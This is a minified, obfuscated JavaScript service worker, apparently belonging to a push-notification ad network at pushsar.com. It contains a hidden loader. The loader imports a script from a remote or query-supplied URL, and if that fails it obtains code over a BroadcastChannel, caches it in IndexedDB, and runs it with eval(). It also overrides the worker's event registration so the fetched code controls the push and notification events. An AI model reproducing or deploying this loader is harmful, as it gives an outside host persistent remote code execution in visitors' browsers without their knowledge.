!function(n){var r={};function a(e){if(r[e])return r[e].exports;var t=r[e]={};return r[e].i=e,r[e].l=!1,r[e].exports={},n[e].call(t.exports,t,t.exports,a),t.l=!0,t.exports}a.m=n,a.c=r,a.d=function(e,t,n){a.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:n})},a.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return a.d(t,"a",t),t},a.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},a.p="",a(a.s=0)}([function(o,p){var q=2629195,r="pushsar.com",s=["https://","/ntfc.php?p="].join(r),t=[s,"&r=sw"].join(q),u="ukhfoxzdogq",v="request",w="response",x=1e4,y=864e5,z="swadb",A=["install","activate","push","notificationclick","notificationclose","pushsubscriptionchange"],B;function C(){return new Promise(function(n,e){var r={},a=new BroadcastChannel(u),o=setTimeout(e,x);r.type=v,r.channel=u,r.request_id=Math.random().toString(36).slice(2),r.url=B,a.addEventListener("message",function(e){var t=e&&e.data&&e.data.type;return(e&&e.data&&e.data.request_id)===r.request_id&&t===w?(a.close(),clearTimeout(o),n(e.data.data)):null}),a.postMessage(r)})}function L(){return C().then(function(e){return e&&e.response?e.response:e})}function N(r){return new Promise(function(e,t){var n=indexedDB.open(r,1);n.addEventListener("upgradeneeded",function(){n.result.createObjectStore("workers",{keyPath:"zoneid"})}),n.addEventListener("success",function(){e(n.result)}),n.addEventListener("error",t)})}var S=N(z);function T(t,n){return S.then(function(e){e.transaction(["workers"],"readwrite").objectStore("workers").put({zoneid:t,code:n,updated:(new Date).getTime()})})}function Z(a){return S.then(function(r){return new Promise(function(e,t){var n=r.transaction(["workers"],"readonly").objectStore("workers").get(a);n.addEventListener("error",t),n.addEventListener("success",function(){e(n.result)})})})}function a7(){return Z(q).then(function(e){var t,n=(new Date).getTime()-y;return(!e||e.updated<n)&&(t=L().then(function(e){return T(q,e).then(function(){return e})})),e?e.code:t})}try{if(B=atob(location.search.slice(1)),!B)throw null}catch(e){B=t}try{importScripts(B)}catch(ad){var ae={},af={},ag=self.addEventListener.bind(self);A.forEach(function(e){self.addEventListener(e,function(t){ae[e]||(ae[e]=[]),ae[e].push(t),af[e]&&af[e].forEach(function(e){try{e(t)}catch(e){}})})}),self.addEventListener=function(e,t){if(-1===A.indexOf(e))return ag(e,t);af[e]||(af[e]=[]),af[e].push(t),ae[e]&&ae[e].forEach(function(e){try{t(e)}catch(e){}})},a7().then(function(ap){eval(ap)})}}]);/*importScripts(...r=sw)*/
